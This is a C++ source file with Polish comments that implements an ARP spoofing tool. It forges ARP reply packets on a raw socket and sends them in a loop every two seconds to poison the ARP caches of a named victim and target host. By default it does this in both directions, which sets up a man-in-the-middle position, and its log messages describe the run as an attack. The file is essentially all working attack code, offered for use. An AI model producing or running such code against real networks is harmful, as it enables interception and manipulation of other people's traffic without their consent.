#include "ArpSpoofer.hpp"
#include "NetworkUtils.hpp"
#include <iostream>
#include <chrono>
#include <cstring>

////////////////////////////////////////////////////////////
ArpSpoofer::ArpSpoofer(const IPAddress& victimIp, const IPAddress& targetIp, bool oneWayMode)
	: victimIp(victimIp)
	, targetIp(targetIp)
	, oneWayMode(oneWayMode)
	, running(false) {
	
	// Inicjalizuj adresy MAC zerami
	std::memset(victimMac, 0, 6);
	std::memset(targetMac, 0, 6);
	std::memset(myMac, 0, 6);
	
	// Utwórz raw socket
	socket = std::make_unique<RawSocket>();
}

////////////////////////////////////////////////////////////
ArpSpoofer::~ArpSpoofer() {
	stop();
}

////////////////////////////////////////////////////////////
void ArpSpoofer::setVictimMac(const uint8_t mac[6]) {
	std::memcpy(victimMac, mac, 6);
}

////////////////////////////////////////////////////////////
void ArpSpoofer::setTargetMac(const uint8_t mac[6]) {
	std::memcpy(targetMac, mac, 6);
}

////////////////////////////////////////////////////////////
void ArpSpoofer::setMyMac(const uint8_t mac[6]) {
	std::memcpy(myMac, mac, 6);
}

////////////////////////////////////////////////////////////
void ArpSpoofer::setLogCallback(std::function<void(const std::string&)> callback) {
	logCallback = callback;
}

////////////////////////////////////////////////////////////
bool ArpSpoofer::start() {
	if (running.load()) {
		log("Atak ARP jest już aktywny");
		return false;
	}
	
	if (!isReady()) {
		log("Brak wymaganych danych do rozpoczęcia ataku");
		return false;
	}
	
	if (!socket->open()) {
		log("Nie udało się otworzyć raw socket");
		return false;
	}
	
	running = true;
	spoofThread = std::thread(&ArpSpoofer::spoofLoop, this);
	
	log("Atak ARP rozpoczęty");
	return true;
}

////////////////////////////////////////////////////////////
void ArpSpoofer::stop() {
	if (!running.load()) {
		return;
	}
	
	running = false;
	
	if (spoofThread.joinable()) {
		spoofThread.join();
	}
	
	socket->close();
	
	log("Atak ARP zatrzymany");
}

////////////////////////////////////////////////////////////
bool ArpSpoofer::sendSpoofPacket() {
	if (!isReady()) {
		return false;
	}
	
	bool success = true;
	
	// Oszukuj ofiarę - powiedz jej, że nasz MAC odpowiada za adres IP celu
	success &= sendArpReply(victimIp, victimMac, targetIp);
	
	// Jeśli nie jest tryb jednokierunkowy, oszukuj też cel
	if (!oneWayMode) {
		success &= sendArpReply(targetIp, targetMac, victimIp);
	}
	
	return success;
}

////////////////////////////////////////////////////////////
bool ArpSpoofer::sendArpReply(const IPAddress& targetIp, const uint8_t targetMac[6], const IPAddress& spoofedIp) {
	// Sprawdź czy mamy wszystkie wymagane dane
	if (targetIp.isEmpty() || spoofedIp.isEmpty()) {
		return false;
	}
	
	// Utwórz pakiet ARP reply
	uint8_t packet[42]; // Ethernet header (14) + ARP header (28)
	
	// Ethernet header
	EthernetHeader* eth = reinterpret_cast<EthernetHeader*>(packet);
	std::memcpy(eth->dest, targetMac, 6);
	std::memcpy(eth->src, myMac, 6);
	eth->type = htons(0x0806); // ARP
	
	// ARP header
	ArpHeader* arp = reinterpret_cast<ArpHeader*>(packet + 14);
	arp->hardware_type = htons(1); // Ethernet
	arp->protocol_type = htons(0x0800); // IPv4
	arp->hardware_size = 6;
	arp->protocol_size = 4;
	arp->opcode = htons(2); // ARP Reply
	
	std::memcpy(arp->sender_mac, myMac, 6);
	std::memcpy(arp->sender_ip, spoofedIp.data(), 4);
	std::memcpy(arp->target_mac, targetMac, 6);
	std::memcpy(arp->target_ip, targetIp.data(), 4);
	
	// Wyślij pakiet
	return socket->send(packet, sizeof(packet));
}

////////////////////////////////////////////////////////////
bool ArpSpoofer::sendArpRequest(const IPAddress& targetIp) {
	if (targetIp.isEmpty()) {
		return false;
	}
	
	// Utwórz pakiet ARP request
	uint8_t packet[42]; // Ethernet header (14) + ARP header (28)
	
	// Ethernet header
	EthernetHeader* eth = reinterpret_cast<EthernetHeader*>(packet);
	std::memset(eth->dest, 0xFF, 6); // Broadcast
	std::memcpy(eth->src, myMac, 6);
	eth->type = htons(0x0806); // ARP
	
	// ARP header
	ArpHeader* arp = reinterpret_cast<ArpHeader*>(packet + 14);
	arp->hardware_type = htons(1); // Ethernet
	arp->protocol_type = htons(0x0800); // IPv4
	arp->hardware_size = 6;
	arp->protocol_size = 4;
	arp->opcode = htons(1); // ARP Request
	
	std::memcpy(arp->sender_mac, myMac, 6);
	// sender_ip zostanie ustawione przez użytkownika
	std::memset(arp->target_mac, 0, 6);
	std::memcpy(arp->target_ip, targetIp.data(), 4);
	
	// Wyślij pakiet
	return socket->send(packet, sizeof(packet));
}

////////////////////////////////////////////////////////////
void ArpSpoofer::spoofLoop() {
	log("Rozpoczęto pętlę ataku ARP");
	
	while (running.load()) {
		if (sendSpoofPacket()) {
			log("Wysłano pakiet ARP spoof");
		} else {
			log("Błąd podczas wysyłania pakietu ARP spoof");
		}
		
		// Czekaj 2 sekundy przed następnym pakietem
		std::this_thread::sleep_for(std::chrono::seconds(2));
	}
	
	log("Zakończono pętlę ataku ARP");
}

////////////////////////////////////////////////////////////
void ArpSpoofer::log(const std::string& message) const {
	if (logCallback) {
		logCallback(message);
	} else {
		std::cout << "[ArpSpoofer] " << message << std::endl;
	}
}

////////////////////////////////////////////////////////////
bool ArpSpoofer::isReady() const {
	// Sprawdź czy mamy wszystkie wymagane adresy IP
	if (victimIp.isEmpty() || targetIp.isEmpty()) {
		return false;
	}
	
	// Sprawdź czy mamy wszystkie wymagane adresy MAC
	bool hasVictimMac = std::any_of(victimMac, victimMac + 6, [](uint8_t b) { return b != 0; });
	bool hasTargetMac = std::any_of(targetMac, targetMac + 6, [](uint8_t b) { return b != 0; });
	bool hasMyMac = std::any_of(myMac, myMac + 6, [](uint8_t b) { return b != 0; });
	
	return hasVictimMac && hasTargetMac && hasMyMac;
} 